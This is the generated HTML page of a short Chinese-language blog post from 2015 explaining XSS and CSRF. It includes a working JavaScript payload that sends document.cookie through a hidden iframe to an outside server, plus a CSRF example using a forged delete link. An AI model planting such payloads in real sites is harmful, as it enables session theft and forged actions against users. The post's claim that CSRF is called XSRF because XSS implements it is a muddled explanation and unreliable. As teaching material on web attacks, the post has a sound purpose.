@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>xss csrf 捋之</title>
+  <meta name="description" content="XSS： 通过客户端脚本语言（最常见如：JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！">
+  <meta name="author" content="Wei Wang">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="xss csrf 捋之">
+  <meta name="twitter:description" content="XSS： 通过客户端脚本语言（最常见如：JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！">
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="xss csrf 捋之">
+  <meta property="og:description" content="XSS： 通过客户端脚本语言（最常见如：JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！">
+  
+  <link rel="icon" type="image/png" href="/assets/images/favicon.png" />
+  <link href="/assets/images/favicon.png" rel="shortcut icon" type="image/png">
+  
+  <link rel="stylesheet" href="/css/main.css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="canonical" href="http://localhost:4000/2015/11/security/">
+  <link rel="alternate" type="application/rss+xml" title="fanyer" href="http://localhost:4000/feed.xml">
+  
+  <meta name="google-site-verification" content="1-1ZlHoRvM0T2FqPbW2S-qLgYXN6rsn52kErlMPd_gw" />
+  
+</head>
+
+
+  <body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="fa fa-list btn-mobile-menu__icon"></i>
+        <i class="fa fa-angle-up btn-mobile-close__icon hidden"></i>
+    </span>
+    
+    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/assets/images/background-cover.jpg')">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        <a href="/#blog" title="前往 fanyer 的主页" class="blog-button"><img src="/assets/images/avatar.jpg" width="80" alt="fanyer logo" class="panel-cover__logo logo" /></a>
+        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for fanyer" class="blog-button">fanyer</a></h1>
+        
+        <span class="panel-cover__subtitle panel-subtitle">Code, Design, and Things in Between</span>
+        
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description"></p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+        
+        <p class="panel-cover__description">Just Help Yourself</p>
+        
+        
+        <div class="navigation-wrapper">
+          <div>
+            <nav class="cover-navigation cover-navigation--primary">
+              <ul class="navigation">
+                <li class="navigation__item"><a href="/#blog" title="Visit blog" class="blog-button">Blog</a></li>
+                
+              </ul>
+            </nav>
+          </div>
+          
+          <div><nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+  
+  <!-- Weibo -->
+  <li class="navigation__item">
+    <a href="http://weibo.com/sysu_fanyer" title="@sysu_fanyer 的微博" target="_blank">
+      <i class='social fa fa-weibo'></i>
+      <span class="label">Weibo</span>
+    </a>
+  </li>
+  
+
+  
+  <!-- Github -->
+  <li class="navigation__item">
+    <a href="https://github.com/fanyer" title="@fanyer 的 Github" target="_blank">
+      <i class='social fa fa-github'></i>
+      <span class="label">Github</span>
+    </a>
+  </li>
+  
+  
+  
+
+  
+
+  <!-- RSS -->
+  <li class="navigation__item">
+    <a href="/feed.xml" rel="author" title="RSS" target="_blank">
+      <i class='social fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li>
+
+  
+  <!-- Email -->
+  <li class="navigation__item">
+    <a href="mailto:iofanyer@gmail.com" title="Contact me">
+      <i class='social fa fa-envelope'></i>
+      <span class="label">Email</span>
+    </a>
+  </li>
+  
+
+  </ul>
+</nav>
+</div>
+        </div>
+      </div>
+    </div>
+    
+    
+    <div class="panel-cover--overlay cover-red"></div>
+    
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner">
+            <article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="2015-11-29 16:48:52 +0800" itemprop="datePublished" class="post-meta__date date">2015-11-29</time> &#8226; <span class="post-meta__tags tags"></span>
+    </div>
+    <h1 class="post-title">xss csrf 捋之</h1>
+  </header>
+
+  <section class="post">
+    <p>XSS： 通过客户端脚本语言（最常见如：JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！</p>
+
+<p>CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。</p>
+
+<blockquote>
+  <p>XSS与CSRF的区别，虽然这两个关键词时常抱团出现，但他们两个是不同维度的东西（或者说他们的目的是不一样的）。 XSS更偏向于方法论，CSRF更偏向于一种形式，只要是伪造用户发起的请求，都可成为CSRF攻击。</p>
+</blockquote>
+
+<p>通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。 XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。</p>
+
+<h3 id="xss">XSS</h3>
+<p>那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：</p>
+
+<pre><code class="language-`">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中
+(function(window, document) {
+    // 构造泄露信息用的 URL
+    var cookies = document.cookie;
+    var xssURIBase = "http://192.168.123.123/myxss/";
+    var xssURI = xssURIBase + window.encodeURI(cookies);
+    // 建立隐藏 iframe 用于通讯
+    var hideFrame = document.createElement("iframe");
+    hideFrame.height = 0;
+    hideFrame.width = 0;
+    hideFrame.style.display = "none";
+    hideFrame.src = xssURI;
+    // 开工
+    document.body.appendChild(hideFrame);
+})(window, document);
+</code></pre>
+
+<p>此段代码携带着cookie信息传输给了 http://192.168.123.123/myxss/… 这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php 中写一些xxx的代码，如把用户信息存进自己的数据库）。</p>
+
+<p>这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。</p>
+
+<h3 id="csrf">CSRF</h3>
+
+<p>最简单的CSRF攻击（没有用到XSS的哦）：一个论坛，经过多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com/bbs/delete_article.php?id=“X” 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com/bbs/delete_article.php?id=“X” ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况。既然删除操作可以伪造，那么只要细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）都可以伪造！</p>
+
+  </section>
+</article>
+
+<section class="read-more">
+   
+   
+   <div class="read-more-item">
+       <span class="read-more-item-dim">最近的文章</span>
+       <h2 class="post-list__post-title post-title"><a href="/2016/04/caddy-ace/" title="link to caddy ace">caddy ace</a></h2>
+       <p class="excerpt">看了10天的golang， 写了一些东西，参考tj的n写了gvm环境版本控制，不过是用shell写的。今天在migrate模版引擎的时候， 之前是用martini+ ace 写的站点。偶然看到了一个封装很规范的go服务器caddy, 所以想要migrate,顺手试了一下给caddy写扩展，项目caddy-acecaddy为扩展提供了RegisterPlugin方法，一般在插件包的init函数中调用，使用方法如下：caddy.RegisterPlugin("basicauth", caddy...&hellip;</p>
+       <div class="post-list__meta"><time datetime="2016-04-30 13:48:52 +0800" class="post-list__meta--date date">2016-04-30</time> &#8226; <span class="post-list__meta--tags tags"></span><a class="btn-border-small" href=/2016/04/caddy-ace/>继续阅读</a></div>
+   </div>
+   
+   
+   
+   
+   <div class="read-more-item">
+       <span class="read-more-item-dim">更早的文章</span>
+       <h2 class="post-list__post-title post-title"><a href="/2015/11/escape/" title="link to xss csrf 捋之(2)  some转义for抗xss">xss csrf 捋之(2)  some转义for抗xss</a></h2>
+       <p class="excerpt">1.任何js runtime的解决方案XML HTML字符实体var keys = Object.keys || function(obj) {    obj = Object(obj)    var arr = []       for (var a in obj) arr.push(a)    return arr}var invert = function(obj) {    obj = Object(obj)    var result = {}    for (var a in ...&hellip;</p>
+       <div class="post-list__meta"><time datetime="2015-11-29 16:48:52 +0800" class="post-list__meta--date date">2015-11-29</time> &#8226; <span class="post-list__meta--tags tags"></span><a class="btn-border-small" href=/2015/11/escape/>继续阅读</a></div>
+   </div>
+   
+</section>
+
+<section class="post-comments">
+  
+    <div id="disqus_thread"></div>
+    <script>
+    
+    var disqus_config = function () {
+        this.page.url = "http://localhost:4000/2015/11/security/";
+        this.page.identifier = "/2015/11/security/";
+    };
+
+    var disqus_shortname = 'fanyer';
+    
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>要查看<a href="http://disqus.com/?ref_noscript"> Disqus </a>评论，请启用 JavaScript</noscript>
+    
+  
+  
+  
+  
+</section>
+
+
+            <section class="footer">
+    <footer>
+    	<span class="footer__copyright">本站点采用<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享 署名-非商业性使用-相同方式共享 4.0 国际 许可协议</a></span>
+        <span class="footer__copyright">由 <a href="https://jekyllrb.com">Jekyll</a> 于 2017-06-06 生成，感谢 <a href="https://www.digitalocean.com/?refcode=30ed2d146762">Digital Ocean</a> 为本站提供稳定的 VPS 服务</span>
+        <span class="footer__copyright">本站采用 <a href="https://github.com/onevcat/vno-jekyll">Vno - Jekyll</a> 作为主题，您可以在 GitHub 找到<a href="https://github.com/onevcat/OneV-s-Den">本站源码</a> - &copy; 2017</span>
+    </footer>
+</section>
+
+        </div>
+    </div>
+    
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+
+
+    
+  </body>
+
+</html>
